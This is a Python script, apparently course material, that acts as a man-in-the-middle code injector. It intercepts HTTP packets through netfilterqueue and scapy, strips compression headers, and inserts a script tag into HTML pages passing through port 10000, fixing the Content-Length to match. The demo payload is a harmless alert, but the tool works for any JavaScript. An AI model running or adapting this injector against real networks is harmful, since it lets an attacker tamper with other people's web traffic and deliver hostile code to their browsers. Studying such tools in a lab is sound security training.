#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 10000:
            print("[+] Request")
            # Use regex to remove encoding in packet
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")
            # Retrieve modified packet
            new_packet = set_load(scapy_packet, load)
            # set payload to the string of the new packet
            packet.set_payload(str(new_packet))

        elif scapy_packet[scapy.TCP].sport == 10000:
            print("[+] Response")
            print(scapy_packet.show())
            # Add javascript code to html
            injection_code = "<script>alert('test');</script>"
            load = scapy_packet[scapy.Raw].load.replace("</body>", injection_code + "</body>")
            new_packet = set_load(scapy_packet, load)
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            packet.set_payload(str(new_packet))
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                # Replace content_length
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
